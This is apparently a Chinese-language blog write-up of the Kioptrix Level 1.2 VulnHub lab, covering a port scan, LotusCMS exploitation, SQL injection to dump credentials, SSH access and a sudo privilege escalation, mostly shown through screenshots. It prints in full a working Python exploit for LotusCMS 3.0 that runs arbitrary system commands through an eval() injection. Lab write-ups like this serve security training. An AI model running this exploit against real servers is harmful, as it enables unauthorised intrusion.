+++
title = '0x028 Kioptrix Level 1.2'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCEd82406e1ceb19328fc7b540808c2bbe5截图.png)

# 渗透

LotusCMS漏洞，利用脚本：

```
#!/usr/bin/python
# Lotus CMS 3.0 eval() Remote Command Execition Exploit
# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/
# Auther Vaibhav Joshi(https://twitter.com/vj0shii)
import sys,requests,os

def execute(URL):
    os.system("clear")
    print("\t--------------------------------------------------------------")
    print("\t|        Lotus CMS 3.0 eval() Remote Command Execition       |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : http://secunia.com/secunia_research/2011-21/   |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    while True:
        loginurl = URL+"index.php"
        command = raw_input("# ")
        if command == "exit":
            print("Goodbye!")
            exit(0)
        payload = "index');${system('"+command+"')};#"
        r = requests.post(loginurl,headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'page': payload})
        text = r.text
        t = text.split("</html>")
        print(t[1])


def Verify(URL):
    r = requests.get(URL,allow_redirects=False)
    if r.status_code != 200:
        print("Url is not valid")
        exit(0)

try:
    print("\t--------------------------------------------------------------")
    print("\t|        Lotus CMS 3.0 eval() Remote Command Execition       |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : http://secunia.com/secunia_research/2011-21/   |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    if len(sys.argv) < 3:
        print("\t| Usage     : %s <IP> <PORT>                            |" % sys.argv[0])
        print("\t--------------------------------------------------------------")
        sys.exit()
    host = sys.argv[1]
    port = sys.argv[2]
    loc = raw_input("Enter Home page URI of CMS (Default /): ")
    if loc == "":
        loc = "/"
    URL = "http://" + host + ":" + port + loc
    Verify(URL)
    execute(URL)

except Exception as error:
    print 'Caught this error: ' + repr(error)
```

![](/vulnhub_img/WEBRESOURCE965e967ef8d2aab44edd44912a6ce454截图.png)

sql注入

![](/vulnhub_img/WEBRESOURCE5c69b0c7c9c858c2f9b444d3ef286d08截图.png)

脱裤，发现账号密码：

![](/vulnhub_img/WEBRESOURCE51c58f1012bc9ad265da29840fcdf7d2截图.png)

ssh直接连接报错:

![](/vulnhub_img/WEBRESOURCEf8608d45e3d78f5abed79787b502b801截图.png)

修复，添加一个配置文件即可：

![](/vulnhub_img/WEBRESOURCEd78f037969724992a47a7d2b24f619c2截图.png)

重新连接：

![](/vulnhub_img/WEBRESOURCE7ce1f1deb5d10f9b72c7f59df4716967截图.png)

# 提权

sudo -l 

![](/vulnhub_img/WEBRESOURCE8a35da98dbabbed0ffba9ad13f288bc8截图.png)

报错：

![](/vulnhub_img/WEBRESOURCE25b8fccb229b15bc41ac0c9ea9267662截图.png)

修复一下：

export TERM=xterm

![](/vulnhub_img/WEBRESOURCE978e57aafe89cd1d8eacdd65e1832730截图.png)

然后就是研究这个东西的用法了，按了半天的键盘，发现主要是靠F数字键进行使用的：

F3打开文件，编辑文件

![](/vulnhub_img/WEBRESOURCEe7dbac6862095f187fbc204233a0380b截图.png)

![](/vulnhub_img/WEBRESOURCE7d76fe6d3fa4d606db31244eeca10a29截图.png)